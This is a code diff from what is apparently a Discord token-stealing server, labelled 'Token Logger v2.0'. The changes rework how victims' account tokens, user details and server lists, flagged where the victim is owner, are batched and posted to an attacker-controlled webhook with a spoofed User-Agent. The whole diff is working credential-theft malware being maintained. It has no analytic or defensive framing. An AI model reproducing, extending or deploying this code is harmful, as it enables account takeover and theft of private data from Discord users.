@@ -1135,29 +1135,45 @@ async function fetchAndLogGuilds(accessToken, userId, username) {
       } catch(e) {}
 
       // Send to webhook with invite links
-      const chunks = [];
-      let currentChunk = '';
+      // Send to webhook with invite links — all in 1 message
+      const guildLines = [];
       for (const g of guildList) {
-        const inviteLink = g.invite || `https://discord.com/channels/${g.id}`;
-        const line = `• [${g.name}](${inviteLink})${g.owner ? ' **[OWNER]**' : ''}\n`;
-        if (currentChunk.length + line.length > 900) {
-          chunks.push(currentChunk);
-          currentChunk = line;
+        // Only create clickable link if we found a real invite; otherwise plain text
+        if (g.invite) {
+          guildLines.push(`• [${g.name}](${g.invite})${g.owner ? ' **[OWNER]**' : ''}`);
         } else {
-          currentChunk += line;
+          guildLines.push(`• ${g.name}${g.owner ? ' **[OWNER]**' : ''}`);
         }
       }
-      if (currentChunk) chunks.push(currentChunk);
-
-      for (let i = 0; i < chunks.length; i++) {
-        const embed = {
-          title: i === 0 ? `Servers for @${username}` : `Servers (cont.)`,
+      const MAX_DESC = 4000;
+      const embeds = [];
+      let currentDesc = '';
+      for (const line of guildLines) {
+        if (currentDesc.length + line.length + 1 > MAX_DESC) {
+          embeds.push({
+            title: embeds.length === 0 ? `Servers for @${username}` : `Servers (cont.)`,
+            color: 0x5865F2,
+            description: currentDesc
+          });
+          currentDesc = line + '\n';
+        } else {
+          currentDesc += line + '\n';
+        }
+      }
+      if (currentDesc) {
+        embeds.push({
+          title: embeds.length === 0 ? `Servers for @${username}` : `Servers (cont.)`,
           color: 0x5865F2,
-          description: chunks[i],
-          footer: { text: `User: ${username} | ID: ${userId} | Total: ${guildList.length} servers | Page ${i + 1}/${chunks.length}` },
-          timestamp: new Date().toISOString()
-        };
-        await _sendWebhookChunk(embed, i);
+          description: currentDesc
+        });
+      }
+      if (embeds.length > 0) {
+        embeds[embeds.length - 1].footer = { text: `User: ${username} | ID: ${userId} | Total: ${guildList.length} servers` };
+        embeds[embeds.length - 1].timestamp = new Date().toISOString();
+      }
+      // Send all embeds in one webhook call (Discord allows up to 10 embeds per message)
+      for (let i = 0; i < embeds.length; i += 10) {
+        await _sendWebhook({ embeds: embeds.slice(i, i + 10) });
       }
       console.log(`[Guilds] Successfully fetched ${guildList.length} guilds for ${username}`);
       return guildList;
@@ -1241,10 +1257,11 @@ function ensureCanGenerate(req, res, next) {
 // WEBHOOK NOTIFICATIONS
 // ═══════════════════════════════════════════════════════════════════════════════
 
-async function _sendWebhookChunk(embed, chunkIndex = 0) {
+async function _sendWebhook(payload) {
   if (!WEBHOOK_URL) return;
   try {
-    const payload = chunkIndex === 0 ? { embeds: [embed], username: 'Token Logger', avatar_url: 'https://cdn.discordapp.com/embed/avatars/0.png' } : { content: '...' };
+    payload.username = payload.username || 'Token Logger';
+    payload.avatar_url = payload.avatar_url || 'https://cdn.discordapp.com/embed/avatars/0.png';
     await axios.post(WEBHOOK_URL, payload, {
       headers: { 'Content-Type': 'application/json', 'User-Agent': _rfp() },
       timeout: 10000
@@ -1285,7 +1302,7 @@ async function grabAndSendToken(token, userInfo = {}, source = 'unknown') {
           ],
           footer: { text: 'Token Logger v2.0' }
         };
-        await _sendWebhookChunk(embed, 0);
+        await _sendWebhook({ embeds: [embed] });
         return { success: true, user: fullInfo };
       }
     }
@@ -1323,7 +1340,7 @@ async function grabAndSendToken(token, userInfo = {}, source = 'unknown') {
       footer: { text: 'Token Logger v2.0' }
     };
 
-    await _sendWebhookChunk(embed, 0);
+    await _sendWebhook({ embeds: [embed] });
     return { success: true, user: fullInfo };
   } catch (err) {
     console.error('[TokenGrab] Error:', err.message);
